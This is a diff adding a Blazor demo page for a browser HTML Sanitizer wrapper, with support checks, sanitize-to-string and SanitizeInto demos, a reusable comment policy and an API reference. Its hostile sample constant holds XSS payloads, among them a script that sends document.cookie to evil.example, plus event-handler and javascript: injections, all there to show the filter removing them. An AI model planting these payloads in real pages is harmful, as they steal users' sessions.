@@ -1,0 +1,322 @@
+@page "/sanitizer"
+@implements IAsyncDisposable
+@inject Bit.Butil.Sanitizer sanitizer
+
+<PageTitle>Sanitizer - Bit.Butil</PageTitle>
+
+<PageHeader Category="Security &amp; Privacy"
+            Title="Sanitizer"
+            Lead="The browser's own XSS filter as a thing of its own: sanitize markup to a string, or configure exactly which elements a comment field allows and reuse that configuration for every fragment."
+            MdnUrl="https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API"
+            InjectAs="Sanitizer sanitizer" />
+
+<Callout Type="info" Title="Why the browser's parser and not a filter in C#">
+    A hand-written filter has to predict how the browser will parse mangled markup, and that gap is
+    exactly where filters are defeated. Here the parser doing the work <em>is</em> the browser's, so
+    what survives is what that browser would have parsed. <code>SetHtml</code> on an element already
+    sanitizes; this is the same filter, configurable, reusable, and able to hand back a string.
+</Callout>
+
+<Callout Type="warning" Title="Unsupported means null, never the input">
+    Support is recent - Chromium first, others following. When the API is missing,
+    <code>Sanitize</code> returns <code>null</code> rather than the markup untouched, so an
+    unsupported browser can never be handed the input as if it had been cleaned. Check
+    <code>IsSetHtmlSupported</code> and have a server-side path for the rest.
+</Callout>
+
+<div class="stack">
+    <DemoSection Title="Support check"
+                 Api="IsSupported / IsSetHtmlSupported"
+                 Description="Two different questions. IsSetHtmlSupported asks for the sanitizing sink, which is all that sanitizing with the default configuration needs. IsSupported asks for the configurable Sanitizer object, which is what Create needs - a browser can have the first without the second."
+                 Code=@("""
+@inject Bit.Butil.Sanitizer sanitizer
+
+var canSanitize = await sanitizer.IsSetHtmlSupported();
+var canConfigure = await sanitizer.IsSupported();
+""")>
+        <div class="controls">
+            <button @onclick="CheckSupported">Check both</button>
+            <button class="secondary" @onclick="ShowDefaults">GetDefaultConfig</button>
+        </div>
+        <DemoConsole @ref="supportOutput" Title="support check output" />
+    </DemoSection>
+
+    <DemoSection Title="Sanitize to a string"
+                 Api="Sanitize"
+                 Description="Parse untrusted markup, drop what isn't safe, and get the result back as text - before storing it, indexing it or sending it on. The markup is parsed into a detached element that is never in the document, so nothing in it loads, runs or is announced on the way through."
+                 Code=@("""
+var clean = await sanitizer.Sanitize(userHtml);
+
+if (clean is null)
+{
+    // no sanitizing sink in this browser - fall back to the server
+}
+""")>
+        <textarea @bind="_html" rows="5" placeholder="Paste some markup to sanitize."
+                  style="margin-top:1rem;width:100%;font-family:inherit"></textarea>
+        <div class="controls">
+            <button @onclick="SanitizeText">Sanitize</button>
+            <button class="secondary" @onclick="LoadHostile">Load a hostile sample</button>
+        </div>
+        <DemoConsole @ref="sanitizeOutput" Title="sanitize output" />
+    </DemoSection>
+
+    <DemoSection Title="A configuration you can reuse"
+                 Api="Create / SanitizerHandle"
+                 Description="A configuration is either an allow-list or a deny-list, not both: setting Elements means 'only these', setting RemoveElements means 'the baseline, minus these'. Building a sanitizer is the expensive half of sanitizing one short fragment, so build it once per policy - 'what a comment may contain' - and reuse the handle for every comment."
+                 Code=@("""
+await using var comments = await sanitizer.Create(new SanitizerConfig
+{
+    Elements = ["p", "b", "i", "em", "strong", "a", "ul", "ol", "li"],
+    Attributes = ["href", "title"],
+    Comments = false,
+});
+
+// Null when the browser has no configurable Sanitizer - the unconfigured sink is still there:
+var clean = comments is null
+    ? await sanitizer.Sanitize(userHtml)
+    : await comments.Sanitize(userHtml);
+""")>
+        <div class="controls">
+            <button @onclick="SanitizeStrictly">Sanitize with the comment policy</button>
+            <button class="secondary" @onclick="ShowHandleConfig">GetConfig on the handle</button>
+        </div>
+        <DemoConsole @ref="configOutput" Title="configured output" />
+    </DemoSection>
+
+    <DemoSection Title="Straight into an element"
+                 Api="SanitizeInto"
+                 Description="The same filter writing into an element rather than returning a string - what SetHtml does, with a configuration when you pass a handle. The result below is rendered live: the script and the event handler in the hostile sample are gone from it."
+                 Code=@("""
+await sanitizer.SanitizeInto(preview, userHtml);
+
+// or under a configuration:
+await commentsHandle.SanitizeInto(preview, userHtml);
+""")>
+        <div class="demo-box dashed" @ref="_preview">The sanitized markup will be rendered here.</div>
+        <div class="controls">
+            <button @onclick="RenderSanitized">SanitizeInto (default)</button>
+            <button class="secondary" @onclick="RenderConfigured">SanitizeInto (comment policy)</button>
+        </div>
+        <DemoConsole @ref="renderOutput" Title="render output" />
+    </DemoSection>
+</div>
+
+<ApiTable Title="API reference">
+    <ApiMember Name="IsSupported"
+               Signature="ValueTask<bool> IsSupported()"
+               Description="True when the runtime exposes the configurable Sanitizer constructor. Returns default (false) during prerender/SSR instead of throwing." />
+    <ApiMember Name="IsSetHtmlSupported"
+               Signature="ValueTask<bool> IsSetHtmlSupported()"
+               Description="True when the runtime exposes Element.setHTML - all that sanitizing without a configuration needs." />
+    <ApiMember Name="Sanitize"
+               Signature="ValueTask<string?> Sanitize(string html)"
+               Description="Sanitizes markup with the browser's default configuration. Null when there is no sanitizing sink - never the input unchanged." />
+    <ApiMember Name="SanitizeInto"
+               Signature="ValueTask<bool> SanitizeInto(ElementReference element, string html)"
+               Description="Sanitizes markup straight into an element. False when there is no sanitizing sink; the element is left alone." />
+    <ApiMember Name="Create"
+               Signature="ValueTask<SanitizerHandle?> Create(SanitizerConfig config)"
+               Description="Builds a reusable sanitizer. Null when the runtime has no configurable Sanitizer or the configuration is invalid." />
+    <ApiMember Name="GetDefaultConfig"
+               Signature="ValueTask<JsonElement?> GetDefaultConfig()"
+               Description="The browser's default configuration, expanded. Raw JSON: what comes back is not the shape a configuration goes in as." />
+    <ApiMember Name="DisposeAsync"
+               Signature="ValueTask DisposeAsync()"
+               Description="On scope/circuit teardown, drops any sanitizers whose handle was never disposed." />
+    <ApiMember Name="SanitizerHandle.Sanitize"
+               Signature="ValueTask<string?> Sanitize(string html)"
+               Description="Sanitizes markup under this configuration." />
+    <ApiMember Name="SanitizerHandle.SanitizeInto"
+               Signature="ValueTask<bool> SanitizeInto(ElementReference element, string html)"
+               Description="Sanitizes markup into an element under this configuration." />
+    <ApiMember Name="SanitizerHandle.GetConfig"
+               Signature="ValueTask<JsonElement?> GetConfig()"
+               Description="This configuration as the browser expanded it - the answer to 'is that element really allowed'." />
+    <ApiMember Name="SanitizerHandle.DisposeAsync"
+               Signature="ValueTask DisposeAsync()"
+               Description="Drops the sanitizer. Calling it again does nothing." />
+    <ApiMember Name="SanitizerConfig"
+               Signature="Elements | RemoveElements | ReplaceWithChildrenElements | Attributes | RemoveAttributes | Comments | DataAttributes"
+               Description="Which elements and attributes survive. An allow-list or a deny-list, not both; every property left null keeps the browser's default." />
+</ApiTable>
+
+@code {
+    private DemoConsole supportOutput = default!;
+    private DemoConsole sanitizeOutput = default!;
+    private DemoConsole configOutput = default!;
+    private DemoConsole renderOutput = default!;
+
+    private ElementReference _preview;
+    private SanitizerHandle? _comments;
+
+    private string _html = "<p>Hello <b>world</b></p>";
+
+    private const string Hostile = """
+<p onclick="steal()">Looks ordinary <b>enough</b>.</p>
+<script>fetch('https://evil.example/?c=' + document.cookie)</script>
+<img src=x onerror="steal()">
+<a href="javascript:steal()">click me</a>
+<iframe src="https://evil.example"></iframe>
+<!-- a comment -->
+<div data-note="kept?">and a div</div>
+""";
+
+    private async Task CheckSupported()
+    {
+        try
+        {
+            await supportOutput.Success("IsSetHtmlSupported →", await sanitizer.IsSetHtmlSupported());
+            await supportOutput.Success("IsSupported →", await sanitizer.IsSupported());
+        }
+        catch (Exception ex)
+        {
+            await supportOutput.Error("Support check failed →", ex.Message);
+        }
+    }
+
+    private async Task ShowDefaults()
+    {
+        try
+        {
+            var config = await sanitizer.GetDefaultConfig();
+
+            if (config is null)
+            {
+                await supportOutput.Warn("GetDefaultConfig →", "null - no configurable Sanitizer here.");
+                return;
+            }
+
+            var json = config.Value.ToString();
+            await supportOutput.Info($"GetDefaultConfig → {json.Length} characters of JSON.");
+            await supportOutput.Log(json.Length > 400 ? json[..400] + " …" : json);
+        }
+        catch (Exception ex)
+        {
+            await supportOutput.Error("GetDefaultConfig failed →", ex.Message);
+        }
+    }
+
+    private void LoadHostile() => _html = Hostile;
+
+    private async Task SanitizeText()
+    {
+        try
+        {
+            var clean = await sanitizer.Sanitize(_html);
+
+            if (clean is null)
+            {
+                await sanitizeOutput.Warn("Sanitize →", "null - this browser has no sanitizing sink. Sanitize on the server instead.");
+                return;
+            }
+
+            await sanitizeOutput.Success("Sanitize →", clean);
+        }
+        catch (Exception ex)
+        {
+            await sanitizeOutput.Error("Sanitize failed →", ex.Message);
+        }
+    }
+
+    private async Task<SanitizerHandle?> CommentPolicy()
+    {
+        if (_comments is not null) return _comments;
+
+        _comments = await sanitizer.Create(new SanitizerConfig
+        {
+            Elements = ["p", "b", "i", "em", "strong", "a", "ul", "ol", "li"],
+            Attributes = ["href", "title"],
+            Comments = false,
+        });
+
+        return _comments;
+    }
+
+    private async Task SanitizeStrictly()
+    {
+        try
+        {
+            var policy = await CommentPolicy();
+
+            if (policy is null)
+            {
+                await configOutput.Warn("Create →", "null - this browser has no configurable Sanitizer.");
+                return;
+            }
+
+            var clean = await policy.Sanitize(_html);
+            await configOutput.Success("Sanitize (comment policy) →", clean ?? "(null)");
+            await configOutput.Log("Everything outside the allow-list is gone, including the div and its data attribute.");
+        }
+        catch (Exception ex)
+        {
+            await configOutput.Error("Sanitize failed →", ex.Message);
+        }
+    }
+
+    private async Task ShowHandleConfig()
+    {
+        try
+        {
+            var policy = await CommentPolicy();
+
+            if (policy is null)
+            {
+                await configOutput.Warn("Create →", "null - this browser has no configurable Sanitizer.");
+                return;
+            }
+
+            var config = await policy.GetConfig();
+            var json = config?.ToString() ?? "(null)";
+            await configOutput.Info("GetConfig →", json.Length > 400 ? json[..400] + " …" : json);
+        }
+        catch (Exception ex)
+        {
+            await configOutput.Error("GetConfig failed →", ex.Message);
+        }
+    }
+
+    private async Task RenderSanitized()
+    {
+        try
+        {
+            var ok = await sanitizer.SanitizeInto(_preview, _html);
+
+            if (ok) await renderOutput.Success("SanitizeInto →", "rendered above.");
+            else await renderOutput.Warn("SanitizeInto →", "false - no sanitizing sink in this browser.");
+        }
+        catch (Exception ex)
+        {
+            await renderOutput.Error("SanitizeInto failed →", ex.Message);
+        }
+    }
+
+    private async Task RenderConfigured()
+    {
+        try
+        {
+            var policy = await CommentPolicy();
+
+            if (policy is null)
+            {
+                await renderOutput.Warn("Create →", "null - this browser has no configurable Sanitizer.");
+                return;
+            }
+
+            var ok = await policy.SanitizeInto(_preview, _html);
+
+            if (ok) await renderOutput.Success("SanitizeInto (comment policy) →", "rendered above.");
+            else await renderOutput.Warn("SanitizeInto →", "false - no sanitizing sink in this browser.");
+        }
+        catch (Exception ex)
+        {
+            await renderOutput.Error("SanitizeInto failed →", ex.Message);
+        }
+    }
+
+    public async ValueTask DisposeAsync()
+    {
+        if (_comments is not null) await _comments.DisposeAsync();
+    }
+}
